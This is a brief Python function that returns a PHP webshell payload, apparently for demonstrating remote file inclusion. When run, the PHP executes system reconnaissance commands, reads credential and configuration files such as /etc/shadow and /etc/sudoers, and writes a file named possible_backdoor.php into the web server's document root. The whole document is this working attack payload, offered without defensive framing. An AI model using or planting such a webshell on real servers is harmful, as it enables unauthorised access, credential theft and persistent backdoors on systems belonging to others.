def gen():
	webshell='''
	<?php
	echo "Executing webshell";
	# Add a bunch of possible commands an attacker would use
	$cmd = array('whoami', 'ls', 'ls -ltr', 'cat /etc/shadow', 'cat /etc/passwd', 'cd /', 'id', 'netstat', 'uname -a', 'crontab -l', 'lsmod', 'cat /etc/sudoers', 'cat /etc/os-release', 'ip link show', "cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && echo 'PoC, injected through RFI' | cat > possible_backdoor.php");
	
	foreach ($cmd as &$value) {
		shell_exec($value);
	}
	
	?>
	'''
	return webshell
